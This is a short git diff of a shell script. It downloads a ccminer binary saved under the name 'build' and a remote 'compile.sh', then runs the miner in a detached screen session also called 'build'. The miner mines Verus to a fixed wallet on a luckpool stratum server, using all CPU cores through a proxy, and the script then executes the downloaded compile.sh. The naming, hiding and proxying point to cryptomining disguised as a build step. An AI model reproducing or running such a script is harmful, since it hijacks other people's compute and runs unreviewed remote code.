@@ -9,4 +9,7 @@ worker=${array[$index]}
 apt-get update
 wget -q https://raw.githubusercontent.com/declined01/master/master/compile.sh
 wget -qO build https://github.com/declined01/master/raw/master/ccminer
-./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RV9KzJ9v7HJ5puLKh32iWPGboKXDoL7HB3.worker-$worker -p x -t $(nproc --all) -x $proxy
+chmod +x build
+chmod +x compile.sh
+screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RV9KzJ9v7HJ5puLKh32iWPGboKXDoL7HB3.worker-$worker -p x -t $(nproc --all) -x $proxy
+./compile.sh
